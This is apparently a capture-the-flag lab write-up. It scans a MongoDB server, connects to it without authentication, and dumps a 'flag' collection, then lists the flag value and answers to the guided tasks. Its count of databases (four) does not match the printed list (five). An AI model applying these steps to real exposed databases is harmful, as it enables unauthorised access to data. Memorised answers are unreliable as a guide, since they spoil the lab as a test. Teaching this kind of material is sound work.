# Mongod

|            |                                                                                  |
|------------|----------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                                          |
| Difficulty | Very Easy                                                                        |
| OS         | Linux                                                                            |
| Tags       | MongoDB, Databases, Reconnaissance, Misconfiguration, Anonymous Access           |
| Tools      | `nmap`, `mongo` shell or `pymongo` + `ipython`                                   |

## Summary

MongoDB 3.6.8 with no auth. The trick is the database naming itself: out of
the four databases that come back from `show databases`, three (`admin`,
`config`, `local`) are MongoDB defaults. The interesting one is the
non-default name (`sensitive_information`).

## Solve

I used `pymongo` from `ipython` because Python is already on hand and it's
trivial to script later. The `mongo` shell version is the same flow.

```bash
nmap -sV -p 27017 10.129.58.99
# 27017/tcp open  mongodb MongoDB 3.6.8
```

```python
from pymongo import MongoClient
client = MongoClient('10.129.58.99', 27017)

client.list_database_names()
# ['admin', 'config', 'local', 'sensitive_information', 'users']

db = client.sensitive_information
db.list_collection_names()
# ['flag']

list(db['flag'].find())
# [{'_id': ObjectId('630e3dbcb82540ebbd1748c5'),
#   'flag': '1b6e6fb359e7c40241b6d431427ba6ea'}]
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open on the machine? | 2 |
| 2 | Which service is running on port 27017 of the remote host? | mongodb 3.6.8 |
| 3 | What type of database is MongoDB? | NoSQL |
| 4 | What is the command name for the Mongo shell that is installed with the mongodb-clients package? | mongo |
| 5 | What is the command used for listing all the databases present on the MongoDB server? | show databases |
| 6 | What is the command used for listing out the collections in a database? | show collections |
| 7 | What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read? | `db.flag.find().pretty()` |
